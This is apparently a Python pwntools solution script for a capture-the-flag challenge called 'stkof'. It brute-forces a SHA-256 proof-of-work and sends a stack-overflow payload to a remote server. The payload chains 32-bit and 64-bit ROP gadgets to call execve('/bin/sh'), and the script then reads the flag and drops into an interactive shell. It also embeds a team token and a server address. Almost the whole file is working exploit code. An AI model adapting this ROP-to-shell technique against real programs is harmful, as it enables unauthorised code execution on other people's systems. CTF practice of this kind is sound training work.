from pwn import *
import sys
import hashlib

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./_stkof")
	p = process("./__stkof")
	elf32 = ELF("./_stkof")
	elf64 = ELF("./__stkof")
else:
	p = remote("49.4.51.149","25391")
	token = "b8e1aaeecf33b96814b13c8d53e697a1"
	elf32 = ELF("./_stkof")
	elf64 = ELF("./__stkof")

def debugf():
	if debug:
		gdb.attach(p,"b *0x0804892E")

def proof():
	"""
	'[+]proof: skr=os.urandom(8)'
[DEBUG] Received 0x9f bytes:
    '\n'
    '[+]hashlib.sha256(skr).hexdigest()=357770abb0e41e8b955ef4af3a1ed75c9df643efaab99e7f7ea494741635e961\n'
    "[+]skr[0:5].encode('hex')=9b72210a6f\n"
    "[-]skr.encode('hex')="
	"""
	p.recvuntil("hexdigest()=")
	target = p.recvuntil("\n",drop = True)
	p.recvuntil(".encode('hex')=")
	info = p.recvuntil("\n",drop = True)
	log.info("target:" + target)
	log.info("info:" + info)
	for i in range(256):
		for j in range(256):
			for k in range(256):
				payload = info.decode("hex") + chr(i) + chr(j) + chr(k)
				#print payload
				if hashlib.sha256(payload).hexdigest() == target:
					log.success("find:" + payload)
					p.sendlineafter("skr.encode('hex')=",payload.encode("hex"))
					p.sendlineafter("[+]teamtoken:",token)
					return 

def rop32_sys(p1,p2,p3):
	edx_ecx_ebx = 0x0806e9f1
	int80 = 0x080495a3
	payload = ""
	payload += p32(edx_ecx_ebx) + p32(p3) + p32(p2) + p32(p1)
	payload += p32(int80)
	return payload

def rop32(p1,p2,p3,call_addr,ret):
	p3_ret = 0x0806e9f1
	payload = ""
	payload += p32(call_addr)
	payload += p32(p3_ret) + p32(p1) + p32(p2) + p32(p3)
	payload += p32(ret)
	return payload

def rop64_sys(p1,p2,p3,call_tab):
	rdi_ = 0x00000000004005f6
	rdx_rsi_ = 0x000000000043d9f9
	rax_ = 0x000000000043b97c
	sys_ret = 0x0000000000461645
	payload = ""
	payload += p64(rax_) + p64(call_tab)
	payload += p64(rdx_rsi_) + p64(p3) + p64(p2)
	payload += p64(rdi_) + p64(p1)
	payload += p64(sys_ret)
	return payload

def stream_encode(flag, token):
	s = ""
	for i in range(0, len(flag)):
		s += chr(ord(flag[i]) ^ ord(token[i % len(flag)]))
	return s.encode("hex")

def stream_decode(flag, token):
	flag = flag.decode("hex")
	s = ""
	for i in range(0, len(flag)):
		s += chr(ord(flag[i]) ^ ord(token[i % len(flag)]))
	return s

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
debugf()
if not debug:
	proof()
#p.interactive()
print p.recvuntil("->")
p3_ret = 0x0806e9f1
p2_ret = 0x08055f55
bss32 = 0x080DB500
bss64 = 0x00000000006A4e00
p3_ret64 = 0x0000000000401f32
eax = 0xb
binsh = "/bin/sh"
payload = "a" * (0x10c + 4)
payload += p32(p3_ret) + p32(0)
payload += p64(p3_ret64)
payload += rop32(0,bss32,0xb,elf32.symbols["read"],p2_ret)
payload += p64(p3_ret64)
payload += rop32_sys(bss32,0,0) + "junk"
payload += rop64_sys(0,bss64,eax,0)
payload += rop64_sys(bss64,0,0,59)
p.sendafter("We give you a little challenge, try to pwn it?\n",payload)
p.sendafter("\n",binsh.ljust(eax,"\x00"))
if not debug:
	p.sendline("cat flag_67ffb35925987a027b7fc23901602428")
	flag = p.recv(0x40)
	flag = stream_decode(flag, token)
	print flag
p.interactive()
